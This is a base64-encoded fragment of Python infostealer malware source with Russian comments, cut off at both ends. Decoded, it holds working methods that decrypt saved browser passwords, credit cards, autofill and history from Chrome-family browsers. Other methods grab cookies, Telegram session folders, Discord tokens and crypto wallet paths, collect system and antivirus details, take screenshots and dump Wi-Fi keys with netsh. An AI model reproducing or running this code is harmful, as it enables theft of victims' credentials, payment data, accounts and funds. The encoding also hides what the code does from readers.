R1cm4gIiIKCiAgICBkZWYgc3RlYWxfYnJvd3Nlcl9kYXRhKHNlbGYsIGJyb3dzZXJfbmFtZSwgYnJvd3Nlcl9wYXRoKToKICAgICAgICAiIiLQmtGA0LDQtNC10YIg0LLRgdC1INC00LDQvdC90YvQtSDQuNC3INCx0YDQsNGD0LfQtdGA0LAiIiIKICAgICAgICB0cnk6CiAgICAgICAgICAgICMg0J/QsNGA0L7Qu9C4CiAgICAgICAgICAgIGxvZ2luX2RhdGFfcGF0aCA9IG9zLnBhdGguam9pbihicm93c2VyX3BhdGgsICJEZWZhdWx0IiwgIkxvZ2luIERhdGEiKQogICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhsb2dpbl9kYXRhX3BhdGgpOgogICAgICAgICAgICAgICAgbWFzdGVyX2tleSA9IHNlbGYuZ2V0X21hc3Rlcl9rZXkoYnJvd3Nlcl9wYXRoKQogICAgICAgICAgICAgICAgaWYgbWFzdGVyX2tleToKICAgICAgICAgICAgICAgICAgICB0ZW1wX2RiID0gb3MucGF0aC5qb2luKHRlbXBmaWxlLmdldHRlbXBkaXIoKSwgInRlbXBfbG9naW4uZGIiKQogICAgICAgICAgICAgICAgICAgIHNodXRpbC5jb3B5Mihsb2dpbl9kYXRhX3BhdGgsIHRlbXBfZGIpCiAgICAgICAgICAgICAgICAgICAgY29ubiA9IHNxbGl0ZTMuY29ubmVjdCh0ZW1wX2RiKQogICAgICAgICAgICAgICAgICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAjINCf0LDRgNC+0LvQuAogICAgICAgICAgICAgICAgICAgIGN1cnNvci5leGVjdXRlKCJTRUxFQ1Qgb3JpZ2luX3VybCwgdXNlcm5hbWVfdmFsdWUsIHBhc3N3b3JkX3ZhbHVlIEZST00gbG9naW5zIikKICAgICAgICAgICAgICAgICAgICBmb3Igcm93IGluIGN1cnNvci5mZXRjaGFsbCgpOgogICAgICAgICAgICAgICAgICAgICAgICB1cmwsIHVzZXJuYW1lLCBlbmNyeXB0ZWRfcGFzc3dvcmQgPSByb3cKICAgICAgICAgICAgICAgICAgICAgICAgaWYgdXJsIGFuZCB1c2VybmFtZSBhbmQgZW5jcnlwdGVkX3Bhc3N3b3JkOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVjcnlwdGVkX3Bhc3N3b3JkID0gc2VsZi5kZWNyeXB0X3Bhc3N3b3JkKGVuY3J5cHRlZF9wYXNzd29yZCwgbWFzdGVyX2tleSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGRlY3J5cHRlZF9wYXNzd29yZDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmRhdGFbInBhc3N3b3JkcyJdLmFwcGVuZCh7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJicm93c2VyIjogYnJvd3Nlcl9uYW1lLCAidXJsIjogdXJsLCAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInVzZXJuYW1lIjogdXNlcm5hbWUsICJwYXNzd29yZCI6IGRlY3J5cHRlZF9wYXNzd29yZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgIyDQmNGB0YLQvtGA0LjRjyDQsdGA0LDRg9C30LXRgNCwCiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUIHVybCwgdGl0bGUsIHZpc2l0X2NvdW50IEZST00gdXJscyBPUkRFUiBCWSB2aXNpdF9jb3VudCBERVNDIExJTUlUIDEwMCIpCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciByb3cgaW4gY3Vyc29yLmZldGNoYWxsKCk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmRhdGFbImJyb3dzZXJfaGlzdG9yeSJdLmFwcGVuZCh7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImJyb3dzZXIiOiBicm93c2VyX25hbWUsICJ1cmwiOiByb3dbMF0sIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJ0aXRsZSI6IHJvd1sxXSwgInZpc2l0cyI6IHJvd1syXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6IHBhc3MKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAjINCa0YDQtdC00LjRgtC90YvQtSDQutCw0YDRgtGLCiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUIG5hbWVfb25fY2FyZCwgZXhwaXJhdGlvbl9tb250aCwgZXhwaXJhdGlvbl95ZWFyLCBjYXJkX251bWJlcl9lbmNyeXB0ZWQgRlJPTSBjcmVkaXRfY2FyZHMiKQogICAgICAgICAgICAgICAgICAgICAgICBmb3Igcm93IGluIGN1cnNvci5mZXRjaGFsbCgpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgcm93WzNdOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRlY3J5cHRlZF9jYXJkID0gc2VsZi5kZWNyeXB0X3Bhc3N3b3JkKHJvd1szXSwgbWFzdGVyX2tleSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmRhdGFbInNhdmVkX2NyZWRpdF9jYXJkcyJdLmFwcGVuZCh7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJicm93c2VyIjogYnJvd3Nlcl9uYW1lLCAibmFtZSI6IHJvd1swXSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImV4cGlyZXMiOiBmIntyb3dbMV19L3tyb3dbMl19IiwgIm51bWJlciI6IGRlY3J5cHRlZF9jYXJkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6IHBhc3MKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAjIEF1dG9maWxsINC00LDQvdC90YvQtQogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCBuYW1lLCB2YWx1ZSBGUk9NIGF1dG9maWxsIikKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHJvdyBpbiBjdXJzb3IuZmV0Y2hhbGwoKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZGF0YVsiYXV0b2ZpbGxfZGF0YSJdLmFwcGVuZCh7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImJyb3dzZXIiOiBicm93c2VyX25hbWUsICJmaWVsZCI6IHJvd1swXSwgInZhbHVlIjogcm93WzFdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDogcGFzcwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGNvbm4uY2xvc2UoKQogICAgICAgICAgICAgICAgICAgIG9zLnJlbW92ZSh0ZW1wX2RiKQogICAgICAgIGV4Y2VwdDogCiAgICAgICAgICAgIHBhc3MKCiAgICBkZWYgc3RlYWxfYWxsX2Jyb3dzZXJzKHNlbGYpOgogICAgICAgIGJyb3dzZXJzID0gewogICAgICAgICAgICAiQ2hyb21lIjogb3MucGF0aC5qb2luKG9zLmVudmlyb25bJ1VTRVJQUk9GSUxFJ10sICJBcHBEYXRhIiwgIkxvY2FsIiwgIkdvb2dsZSIsICJDaHJvbWUiLCAiVXNlciBEYXRhIiksCiAgICAgICAgICAgICJPcGVyYSI6IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWydVU0VSUFJPRklMRSddLCAiQXBwRGF0YSIsICJSb2FtaW5nIiwgIk9wZXJhIFNvZnR3YXJlIiwgIk9wZXJhIFN0YWJsZSIpLAogICAgICAgICAgICAiT3BlcmEgR1giOiBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsnVVNFUlBST0ZJTEUnXSwgIkFwcERhdGEiLCAiUm9hbWluZyIsICJPcGVyYSBTb2Z0d2FyZSIsICJPcGVyYSBHWCBTdGFibGUiKSwKICAgICAgICAgICAgIkVkZ2UiOiBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsnVVNFUlBST0ZJTEUnXSwgIkFwcERhdGEiLCAiTG9jYWwiLCAiTWljcm9zb2Z0IiwgIkVkZ2UiLCAiVXNlciBEYXRhIiksCiAgICAgICAgICAgICJCcmF2ZSI6IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWydVU0VSUFJPRklMRSddLCAiQXBwRGF0YSIsICJMb2NhbCIsICJCcmF2ZVNvZnR3YXJlIiwgIkJyYXZlLUJyb3dzZXIiLCAiVXNlciBEYXRhIiksCiAgICAgICAgICAgICJZYW5kZXgiOiBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsnVVNFUlBST0ZJTEUnXSwgIkFwcERhdGEiLCAiTG9jYWwiLCAiWWFuZGV4IiwgIllhbmRleEJyb3dzZXIiLCAiVXNlciBEYXRhIiksCiAgICAgICAgICAgICJWaXZhbGRpIjogb3MucGF0aC5qb2luKG9zLmVudmlyb25bJ1VTRVJQUk9GSUxFJ10sICJBcHBEYXRhIiwgIkxvY2FsIiwgIlZpdmFsZGkiLCAiVXNlciBEYXRhIiksCiAgICAgICAgfQogICAgICAgIAogICAgICAgIGZvciBicm93c2VyX25hbWUsIGJyb3dzZXJfcGF0aCBpbiBicm93c2Vycy5pdGVtcygpOgogICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhicm93c2VyX3BhdGgpOgogICAgICAgICAgICAgICAgc2VsZi5zdGVhbF9icm93c2VyX2RhdGEoYnJvd3Nlcl9uYW1lLCBicm93c2VyX3BhdGgpCgogICAgZGVmIHN0ZWFsX2Nvb2tpZXMoc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBmb3IgYnJvd3Nlcl9uYW1lIGluIFsnY2hyb21lJywgJ29wZXJhJywgJ2VkZ2UnLCAnYnJhdmUnLCAndml2YWxkaScsICdmaXJlZm94J106CiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgY2ogPSBnZXRhdHRyKGJyb3dzZXJfY29va2llMywgYnJvd3Nlcl9uYW1lKSgpCiAgICAgICAgICAgICAgICAgICAgZm9yIGNvb2tpZSBpbiBjajoKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5kYXRhWyJjb29raWVzIl0uYXBwZW5kKHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJicm93c2VyIjogYnJvd3Nlcl9uYW1lLCAiZG9tYWluIjogY29va2llLmRvbWFpbiwgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAibmFtZSI6IGNvb2tpZS5uYW1lLCAidmFsdWUiOiBjb29raWUudmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgIGV4Y2VwdDogCiAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICBleGNlcHQ6IAogICAgICAgICAgICBwYXNzCgogICAgZGVmIHN0ZWFsX3RlbGVncmFtX3Nlc3Npb25zKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgdGVsZWdyYW1fcGF0aHMgPSBbCiAgICAgICAgICAgICAgICBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsnVVNFUlBST0ZJTEUnXSwgIkFwcERhdGEiLCAiUm9hbWluZyIsICJUZWxlZ3JhbSBEZXNrdG9wIiwgInRkYXRhIiksCiAgICAgICAgICAgICAgICBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsnVVNFUlBST0ZJTEUnXSwgIkRvY3VtZW50cyIsICJUZWxlZ3JhbSBEZXNrdG9wIiwgInRkYXRhIikKICAgICAgICAgICAgXQogICAgICAgICAgICBmb3IgcGF0aCBpbiB0ZWxlZ3JhbV9wYXRoczoKICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKHBhdGgpOgogICAgICAgICAgICAgICAgICAgIHNlbGYuZGF0YVsidGVsZWdyYW1fc2Vzc2lvbnMiXS5hcHBlbmQoewogICAgICAgICAgICAgICAgICAgICAgICAicGF0aCI6IHBhdGgsIAogICAgICAgICAgICAgICAgICAgICAgICAiZmlsZXMiOiBbZiBmb3IgZiBpbiBvcy5saXN0ZGlyKHBhdGgpIGlmIG9zLnBhdGguaXNmaWxlKG9zLnBhdGguam9pbihwYXRoLCBmKSldCiAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICBleGNlcHQ6IAogICAgICAgICAgICBwYXNzCgogICAgZGVmIHN0ZWFsX2Rpc2NvcmRfdG9rZW5zKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgZGlzY29yZF9wYXRocyA9IFsKICAgICAgICAgICAgICAgIG9zLnBhdGguam9pbihvcy5lbnZpcm9uWydVU0VSUFJPRklMRSddLCAiQXBwRGF0YSIsICJSb2FtaW5nIiwgImRpc2NvcmQiLCAiTG9jYWwgU3RvcmFnZSIsICJsZXZlbGRiIiksCiAgICAgICAgICAgICAgICBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsnVVNFUlBST0ZJTEUnXSwgIkFwcERhdGEiLCAiUm9hbWluZyIsICJkaXNjb3JkcHRiIiwgIkxvY2FsIFN0b3JhZ2UiLCAibGV2ZWxkYiIpLAogICAgICAgICAgICAgICAgb3MucGF0aC5qb2luKG9zLmVudmlyb25bJ1VTRVJQUk9GSUxFJ10sICJBcHBEYXRhIiwgIlJvYW1pbmciLCAiZGlzY29yZGNhbmFyeSIsICJMb2NhbCBTdG9yYWdlIiwgImxldmVsZGIiKQogICAgICAgICAgICBdCiAgICAgICAgICAgIGZvciBwYXRoIGluIGRpc2NvcmRfcGF0aHM6CiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhwYXRoKToKICAgICAgICAgICAgICAgICAgICBmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKHBhdGgpOgogICAgICAgICAgICAgICAgICAgICAgICBpZiBmaWxlLmVuZHN3aXRoKCcubGRiJykgb3IgZmlsZS5lbmRzd2l0aCgnLmxvZycpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZV9wYXRoID0gb3MucGF0aC5qb2luKHBhdGgsIGZpbGUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgJ3InLCBlbmNvZGluZz0ndXRmLTgnLCBlcnJvcnM9J2lnbm9yZScpIGFzIGY6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRlbnQgPSBmLnJlYWQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAndG9rZW4nIGluIGNvbnRlbnQubG93ZXIoKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZGF0YVsiZGlzY29yZF90b2tlbnMiXS5hcHBlbmQoewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJwYXRoIjogZmlsZV9wYXRoLCAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiY29udGVudCI6IGNvbnRlbnRbOjEwMDBdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0OiAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgZXhjZXB0OiAKICAgICAgICAgICAgcGFzcwoKICAgIGRlZiBzdGVhbF9jcnlwdG9fd2FsbGV0cyhzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgICMgTWV0YU1hc2sKICAgICAgICAgICAgbWV0YW1hc2tfcGF0aHMgPSBbCiAgICAgICAgICAgICAgICBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsnVVNFUlBST0ZJTEUnXSwgIkFwcERhdGEiLCAiUm9hbWluZyIsICJNZXRhTWFzayIpLAogICAgICAgICAgICAgICAgb3MucGF0aC5qb2luKG9zLmVudmlyb25bJ1VTRVJQUk9GSUxFJ10sICJBcHBEYXRhIiwgIkxvY2FsIiwgIkdvb2dsZSIsICJDaHJvbWUiLCAiVXNlciBEYXRhIiwgIkRlZmF1bHQiLCAiTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzIiwgIm5rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiksCiAgICAgICAgICAgIF0KICAgICAgICAgICAgCiAgICAgICAgICAgIGZvciBwYXRoIGluIG1ldGFtYXNrX3BhdGhzOgogICAgICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMocGF0aCk6CiAgICAgICAgICAgICAgICAgICAgc2VsZi5kYXRhWyJtZXRhbWFza19kYXRhIl0uYXBwZW5kKHsid2FsbGV0IjogIk1ldGFNYXNrIiwgInBhdGgiOiBwYXRofSkKICAgICAgICAgICAgCiAgICAgICAgICAgICMg0JTRgNGD0LPQuNC1INC60L7RiNC10LvRjNC60LgKICAgICAgICAgICAgd2FsbGV0X3BhdGhzID0gWwogICAgICAgICAgICAgICAgKCJFeG9kdXMiLCBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsnVVNFUlBST0ZJTEUnXSwgIkFwcERhdGEiLCAiUm9hbWluZyIsICJFeG9kdXMiKSksCiAgICAgICAgICAgICAgICAoIkVsZWN0cnVtIiwgb3MucGF0aC5qb2luKG9zLmVudmlyb25bJ1VTRVJQUk9GSUxFJ10sICJBcHBEYXRhIiwgIlJvYW1pbmciLCAiRWxlY3RydW0iKSksCiAgICAgICAgICAgICAgICAoIkF0b21pYyIsIG9zLnBhdGguam9pbihvcy5lbnZpcm9uWydVU0VSUFJPRklMRSddLCAiQXBwRGF0YSIsICJMb2NhbCIsICJhdG9taWMiKSksCiAgICAgICAgICAgIF0KICAgICAgICAgICAgCiAgICAgICAgICAgIGZvciB3YWxsZXRfbmFtZSwgcGF0aCBpbiB3YWxsZXRfcGF0aHM6CiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhwYXRoKToKICAgICAgICAgICAgICAgICAgICBzZWxmLmRhdGFbImNyeXB0b193YWxsZXRzIl0uYXBwZW5kKHsid2FsbGV0Ijogd2FsbGV0X25hbWUsICJwYXRoIjogcGF0aH0pCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgZXhjZXB0OiAKICAgICAgICAgICAgcGFzcwoKICAgIGRlZiBzdGVhbF9zeXN0ZW1faW5mbyhzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgICMg0JTQtdGC0LDQu9GM0L3QsNGPINGB0LjRgdGC0LXQvNC90LDRjyDQuNC90YTQvtGA0LzQsNGG0LjRjwogICAgICAgICAgICBncHVfaW5mbyA9IHNlbGYuZ2V0X2dwdV9pbmZvKCkKICAgICAgICAgICAgcmFtX2luZm8gPSBzZWxmLmdldF9yYW1faW5mbygpCiAgICAgICAgICAgIGRpc2tfaW5mbyA9IHNlbGYuZ2V0X2Rpc2tfaW5mbygpCiAgICAgICAgICAgIAogICAgICAgICAgICBzZWxmLmRhdGFbInN5c3RlbV9pbmZvIl0gPSB7CiAgICAgICAgICAgICAgICAidXNlcm5hbWUiOiBnZXRwYXNzLmdldHVzZXIoKSwKICAgICAgICAgICAgICAgICJjb21wdXRlcl9uYW1lIjogcGxhdGZvcm0ubm9kZSgpLAogICAgICAgICAgICAgICAgIm9zIjogZiJ7cGxhdGZvcm0uc3lzdGVtKCl9IHtwbGF0Zm9ybS5yZWxlYXNlKCl9IiwKICAgICAgICAgICAgICAgICJhcmNoaXRlY3R1cmUiOiBwbGF0Zm9ybS5hcmNoaXRlY3R1cmUoKVswXSwKICAgICAgICAgICAgICAgICJwcm9jZXNzb3IiOiBwbGF0Zm9ybS5wcm9jZXNzb3IoKSwKICAgICAgICAgICAgICAgICJncHUiOiBncHVfaW5mbywKICAgICAgICAgICAgICAgICJyYW0iOiByYW1faW5mbywKICAgICAgICAgICAgICAgICJkaXNrcyI6IGRpc2tfaW5mbywKICAgICAgICAgICAgICAgICJpcF9sb2NhbCI6IHNvY2tldC5nZXRob3N0YnluYW1lKHNvY2tldC5nZXRob3N0bmFtZSgpKSwKICAgICAgICAgICAgICAgICJpcF9leHRlcm5hbCI6IHNlbGYuZ2V0X2V4dGVybmFsX2lwKCksCiAgICAgICAgICAgICAgICAiYW50aXZpcnVzIjogc2VsZi5nZXRfYW50aXZpcnVzX2luZm8oKSwKICAgICAgICAgICAgICAgICJpbnN0YWxsZWRfc29mdHdhcmUiOiBzZWxmLmdldF9pbnN0YWxsZWRfc29mdHdhcmUoKVs6MTVdLAogICAgICAgICAgICAgICAgInJ1bm5pbmdfcHJvY2Vzc2VzIjogc2VsZi5nZXRfcnVubmluZ19wcm9jZXNzZXMoKVs6MTBdLAogICAgICAgICAgICAgICAgInRpbWVzdGFtcCI6IHN0cihkYXRldGltZS5kYXRldGltZS5ub3coKSkKICAgICAgICAgICAgfQogICAgICAgIGV4Y2VwdDogCiAgICAgICAgICAgIHBhc3MKCiAgICBkZWYgZ2V0X2dwdV9pbmZvKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgcmVzdWx0ID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoIndtaWMgcGF0aCB3aW4zMl9WaWRlb0NvbnRyb2xsZXIgZ2V0IG5hbWUiLCBzaGVsbD1UcnVlKS5kZWNvZGUoJ2NwODY2JykKICAgICAgICAgICAgcmV0dXJuIFtsaW5lLnN0cmlwKCkgZm9yIGxpbmUgaW4gcmVzdWx0LnNwbGl0KCdcXG4nKSBpZiBsaW5lLnN0cmlwKCkgYW5kIGxpbmUuc3RyaXAoKSAhPSAnTmFtZSddWzoyXQogICAgICAgIGV4Y2VwdDogCiAgICAgICAgICAgIHJldHVybiBbXQoKICAgIGRlZiBnZXRfcmFtX2luZm8oc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICByZXN1bHQgPSBzdWJwcm9jZXNzLmNoZWNrX291dHB1dCgid21pYyBtZW1vcnljaGlwIGdldCBjYXBhY2l0eSIsIHNoZWxsPVRydWUpLmRlY29kZSgnY3A4NjYnKQogICAgICAgICAgICByYW1fc2l6ZXMgPSBbaW50KGxpbmUuc3RyaXAoKSkgZm9yIGxpbmUgaW4gcmVzdWx0LnNwbGl0KCdcXG4nKSBpZiBsaW5lLnN0cmlwKCkuaXNkaWdpdCgpXQogICAgICAgICAgICByZXR1cm4gZiJ7c3VtKHJhbV9zaXplcykgLy8gKDEwMjQqKjMpfSBHQiIgaWYgcmFtX3NpemVzIGVsc2UgIlVua25vd24iCiAgICAgICAgZXhjZXB0OiAKICAgICAgICAgICAgcmV0dXJuICJVbmtub3duIgoKICAgIGRlZiBnZXRfZGlza19pbmZvKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgZGlza3MgPSBbXQogICAgICAgICAgICBmb3IgcGFydGl0aW9uIGluIHBzdXRpbC5kaXNrX3BhcnRpdGlvbnMoKToKICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICB1c2FnZSA9IHBzdXRpbC5kaXNrX3VzYWdlKHBhcnRpdGlvbi5tb3VudHBvaW50KQogICAgICAgICAgICAgICAgICAgIGRpc2tzLmFwcGVuZChmIntwYXJ0aXRpb24uZGV2aWNlfSAoe3VzYWdlLnVzZWQvLygxMDI0KiozKX1HQi97dXNhZ2UudG90YWwvLygxMDI0KiozKX1HQikiKQogICAgICAgICAgICAgICAgZXhjZXB0OiAKICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgIHJldHVybiBkaXNrcwogICAgICAgIGV4Y2VwdDogCiAgICAgICAgICAgIHJldHVybiBbXQoKICAgIGRlZiBnZXRfZXh0ZXJuYWxfaXAoc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICByZXR1cm4gcmVxdWVzdHMuZ2V0KCdodHRwczovL2FwaS5pcGlmeS5vcmcnLCB0aW1lb3V0PTUpLnRleHQKICAgICAgICBleGNlcHQ6IAogICAgICAgICAgICByZXR1cm4gIlVua25vd24iCgogICAgZGVmIGdldF9hbnRpdmlydXNfaW5mbyhzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHJlc3VsdCA9IHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KCd3bWljIC9OYW1lc3BhY2U6XFxcXFxcXFxyb290XFxcXFNlY3VyaXR5Q2VudGVyMiBQYXRoIEFudGlWaXJ1c1Byb2R1Y3QgR2V0IGRpc3BsYXlOYW1lJywgc2hlbGw9VHJ1ZSkuZGVjb2RlKCdjcDg2NicpCiAgICAgICAgICAgIHJldHVybiBbbGluZS5zdHJpcCgpIGZvciBsaW5lIGluIHJlc3VsdC5zcGxpdCgnXFxuJykgaWYgbGluZS5zdHJpcCgpIGFuZCAnZGlzcGxheU5hbWUnIG5vdCBpbiBsaW5lXQogICAgICAgIGV4Y2VwdDogCiAgICAgICAgICAgIHJldHVybiBbIlVua25vd24iXQoKICAgIGRlZiBnZXRfaW5zdGFsbGVkX3NvZnR3YXJlKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgcmVzdWx0ID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoJ3dtaWMgcHJvZHVjdCBnZXQgbmFtZScsIHNoZWxsPVRydWUpLmRlY29kZSgnY3A4NjYnLCBlcnJvcnM9J2lnbm9yZScpCiAgICAgICAgICAgIHJldHVybiBbbGluZS5zdHJpcCgpIGZvciBsaW5lIGluIHJlc3VsdC5zcGxpdCgnXFxuJykgaWYgbGluZS5zdHJpcCgpIGFuZCAnTmFtZScgbm90IGluIGxpbmVdCiAgICAgICAgZXhjZXB0OiAKICAgICAgICAgICAgcmV0dXJuIFtdCgogICAgZGVmIGdldF9ydW5uaW5nX3Byb2Nlc3NlcyhzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHJldHVybiBbcC5pbmZvIGZvciBwIGluIHBzdXRpbC5wcm9jZXNzX2l0ZXIoWyduYW1lJywgJ21lbW9yeV9wZXJjZW50J10pIGlmIHAuaW5mb1snbWVtb3J5X3BlcmNlbnQnXSA+IDEuMF0KICAgICAgICBleGNlcHQ6IAogICAgICAgICAgICByZXR1cm4gW10KCiAgICBkZWYgdGFrZV9zY3JlZW5zaG90KHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgc2NyZWVuc2hvdCA9IEltYWdlR3JhYi5ncmFiKCkKICAgICAgICAgICAgc2NyZWVuc2hvdF9wYXRoID0gb3MucGF0aC5qb2luKHRlbXBmaWxlLmdldHRlbXBkaXIoKSwgInNjcmVlbnNob3QucG5nIikKICAgICAgICAgICAgc2NyZWVuc2hvdC5zYXZlKHNjcmVlbnNob3RfcGF0aCkKICAgICAgICAgICAgd2l0aCBvcGVuKHNjcmVlbnNob3RfcGF0aCwgInJiIikgYXMgZjoKICAgICAgICAgICAgICAgIHNlbGYuZGF0YVsic2NyZWVuc2hvdHMiXS5hcHBlbmQoYmFzZTY0LmI2NGVuY29kZShmLnJlYWQoKSkuZGVjb2RlKCkpCiAgICAgICAgICAgIG9zLnJlbW92ZShzY3JlZW5zaG90X3BhdGgpCiAgICAgICAgZXhjZXB0OiAKICAgICAgICAgICAgcGFzcwoKICAgIGRlZiBnZXRfd2lmaV9wYXNzd29yZHMoc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBpZiBwbGF0Zm9ybS5zeXN0ZW0oKSA9PSAiV2luZG93cyI6CiAgICAgICAgICAgICAgICByZXN1bHRzID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoWyduZXRzaCcsICd3bGFuJywgJ3Nob3cnLCAncHJvZmlsZXMnXSwgc2hlbGw9VHJ1ZSkuZGVjb2RlKCdjcDg2NicpLnNwbGl0KCdcXG4nKQogICAgICAgICAgICAgICAgcHJvZmlsZXMgPSBbaS5zcGxpdCgiOiIpWzFdWzE6LTFdIGZvciBpIGluIHJlc3VsdHMgaWYgItCS0YHQtSDQv9GA0L7RhNC40LvQuCDQv9C+0LvRjNC30L7QstCw0YLQtdC70LXQuSIgaW4gaV0KICAgICAgICAgICAgICAgIGZvciBwcm9maWxlIGluIHByb2ZpbGVzOgogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgcmVzdWx0cyA9IHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KFsnbmV0c2gnLCAnd2xhbicsICdzaG93JywgJ3Byb2ZpbGUnLCBwcm9maWxlLCAna2V5PWNsZWFyJ10sIHNoZWxsPVRydWUpLmRlY29kZSgnY3A4NjYnKS5zcGxpdCgnXFxuJykKICAgICAgICAgICAgICAgICAgICAgICAgcGFzc3dvcmQgPSBbYi5zcGxpdCgiOiIpWzFdWzE6LTFdIGZvciBiIGluIHJlc3VsdHMgaWYgItCh0L7QtNC10YDQttC40LzQvtC1INC60LvRjtGH0LAiIGluIGJdCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHBhc3N3b3JkOiAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZGF0YVsid2lmaV9wYXNzd29yZHMiXS5hcHBlbmQoewog